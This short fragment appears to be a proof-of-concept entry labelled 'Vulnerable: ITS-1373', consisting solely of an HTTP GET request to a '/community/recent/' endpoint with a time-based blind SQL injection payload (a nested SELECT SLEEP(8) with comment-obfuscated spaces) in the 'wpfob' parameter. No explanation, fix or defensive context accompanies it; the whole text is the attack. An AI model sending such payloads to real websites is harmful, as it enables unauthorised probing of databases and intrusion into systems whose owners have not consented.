# Vulnerable: ITS-1373
GET /community/recent/?wpfob=(SELECT/**/1/**/FROM/**/(SELECT/**/SLEEP(8))a)
